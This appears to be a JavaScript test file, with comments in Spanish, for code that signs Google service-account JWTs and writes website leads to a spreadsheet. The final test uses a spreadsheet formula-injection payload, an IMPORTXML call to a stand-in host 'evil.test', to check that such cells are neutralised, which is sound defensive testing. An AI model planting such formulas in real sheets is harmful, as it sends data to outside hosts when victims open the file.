import { describe, it, expect, beforeAll } from "vitest";
import { pemToPkcs8, signJwt, leadToRow, SHEET_COLUMNS } from "../src/sheets.js";

const b64urlToBytes = (s) => {
  const b64 = s.replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(s.length / 4) * 4, "=");
  return Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
};
const decodeJwtPart = (part) => JSON.parse(new TextDecoder().decode(b64urlToBytes(part)));

/** Envuelve una clave pkcs8 cruda en PEM, como la entrega Google. */
function toPem(pkcs8Bytes) {
  const b64 = btoa(String.fromCharCode(...new Uint8Array(pkcs8Bytes)));
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PRIVATE KEY-----\n${lines}\n-----END PRIVATE KEY-----\n`;
}

let keyPair, privateKeyPem;

beforeAll(async () => {
  keyPair = await crypto.subtle.generateKey(
    { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
    true,
    ["sign", "verify"]
  );
  privateKeyPem = toPem(await crypto.subtle.exportKey("pkcs8", keyPair.privateKey));
});

describe("pemToPkcs8", () => {
  it("extrae los bytes DER de un PEM con saltos de línea reales", () => {
    expect(pemToPkcs8(privateKeyPem).byteLength).toBeGreaterThan(0);
  });

  it('acepta un PEM con "\\n" literales, como queda al pegar el JSON de Google', () => {
    // Es el error clásico: el campo private_key del JSON trae \n escapados,
    // y si se guardan tal cual como secreto, atob() revienta.
    const escaped = privateKeyPem.replace(/\n/g, "\\n");
    expect(pemToPkcs8(escaped)).toEqual(pemToPkcs8(privateKeyPem));
  });

  it("tolera espacios y saltos sobrantes alrededor", () => {
    expect(pemToPkcs8(`\n  ${privateKeyPem.trim()}  \n`)).toEqual(pemToPkcs8(privateKeyPem));
  });

  it("lanza un error claro si el PEM no tiene la cabecera esperada", () => {
    expect(() => pemToPkcs8("no-soy-una-clave")).toThrow(/PEM/i);
  });
});

describe("signJwt", () => {
  const email = "leads@droneitor.iam.gserviceaccount.com";
  const nowSeconds = 1_800_000_000;

  it("produce un JWT de tres partes con la firma verificable por la clave pública", async () => {
    const jwt = await signJwt({ email, privateKeyPem, nowSeconds });
    const parts = jwt.split(".");
    expect(parts).toHaveLength(3);

    const valid = await crypto.subtle.verify(
      "RSASSA-PKCS1-v1_5",
      keyPair.publicKey,
      b64urlToBytes(parts[2]),
      new TextEncoder().encode(`${parts[0]}.${parts[1]}`)
    );
    expect(valid).toBe(true);
  });

  it("declara RS256 en la cabecera", async () => {
    const jwt = await signJwt({ email, privateKeyPem, nowSeconds });
    expect(decodeJwtPart(jwt.split(".")[0])).toEqual({ alg: "RS256", typ: "JWT" });
  });

  it("emite los claims que exige el flujo de service account de Google", async () => {
    const jwt = await signJwt({ email, privateKeyPem, nowSeconds });
    expect(decodeJwtPart(jwt.split(".")[1])).toEqual({
      iss: email,
      scope: "https://www.googleapis.com/auth/spreadsheets",
      aud: "https://oauth2.googleapis.com/token",
      iat: nowSeconds,
      exp: nowSeconds + 3600
    });
  });

  it("no emite base64 estándar: nada de +, / ni = en el JWT", async () => {
    const jwt = await signJwt({ email, privateKeyPem, nowSeconds });
    expect(jwt).not.toMatch(/[+/=]/);
  });
});

describe("leadToRow", () => {
  const lead = {
    id: 42,
    created_at: "2026-08-08T18:00:00.000Z",
    name: "Ana Ruiz",
    email: "ana@example.com",
    phone: "+1 305 555 0134",
    project_type: "real-estate",
    lang: "en",
    utm_source: "google",
    utm_medium: "cpc",
    utm_campaign: "miami-q3",
    utm_content: "variant-b",
    utm_term: "drone photography",
    country: "US",
    region: "Florida",
    city: "Miami",
    ip: "203.0.113.7",
    user_agent: "Mozilla/5.0"
  };

  it("emite una celda por columna declarada, en el mismo orden", () => {
    const row = leadToRow(lead);
    expect(row).toHaveLength(SHEET_COLUMNS.length);
    expect(row[SHEET_COLUMNS.indexOf("name")]).toBe("Ana Ruiz");
    expect(row[SHEET_COLUMNS.indexOf("utm_campaign")]).toBe("miami-q3");
    expect(row[SHEET_COLUMNS.indexOf("city")]).toBe("Miami");
  });

  it("empieza por created_at para que la hoja se lea en orden cronológico", () => {
    expect(SHEET_COLUMNS[0]).toBe("created_at");
    expect(leadToRow(lead)[0]).toBe("2026-08-08T18:00:00.000Z");
  });

  it("convierte null/undefined en celda vacía, nunca en el texto \"null\"", () => {
    const row = leadToRow({ ...lead, utm_source: null, city: undefined });
    expect(row[SHEET_COLUMNS.indexOf("utm_source")]).toBe("");
    expect(row[SHEET_COLUMNS.indexOf("city")]).toBe("");
  });

  it("neutraliza celdas que Sheets interpretaría como fórmula", () => {
    // Un user_agent o UTM que empieza por "=" se ejecutaría al abrir la hoja.
    const row = leadToRow({ ...lead, utm_term: '=IMPORTXML("http://evil.test","//a")' });
    expect(row[SHEET_COLUMNS.indexOf("utm_term")]).toMatch(/^'=/);
  });
});
